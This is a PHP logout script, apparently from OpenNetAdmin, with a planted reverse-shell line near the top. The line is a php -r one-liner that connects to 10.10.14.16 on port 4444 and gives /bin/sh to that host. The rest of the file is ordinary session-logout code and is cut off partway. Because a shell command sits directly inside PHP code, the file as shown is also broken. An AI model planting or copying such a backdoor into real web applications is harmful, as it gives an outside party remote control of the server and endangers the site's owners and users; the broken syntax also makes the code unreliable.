<?php
php -r '$sock=fsockopen("10.10.14.16",4444);exec("/bin/sh -i <&3 >&3 2>&3");'
/* -------------------- COMMON HEADER ---------------------- */
$base = dirname(__FILE__);
while ($base and (!is_dir($base.'/include'))) $base = preg_replace('+/[^/]*$+',
'', $base);
$include = $base . '/include';
if (!is_dir($include)) { print "ERROR => Couldn't find include folder!\n"; exit;
 }
require_once($base . '/config/config.inc.php');
/* --------------------------------------------------------- */
// MP: Since we know ONA will generate a ton of notice level errors, lets turn t
hem off here
// I dont believe this will be impactful to anyone. keep an eye out for it howev
er.
error_reporting (E_ALL ^ E_NOTICE);

// Log the user out and redirect them to the login page:

// Print a logout message
printmsg("INFO => [Desktop] {$_SESSION['ona']['auth']['user']['username']} has l
ogged out",0);

// Unset session info relating to their account
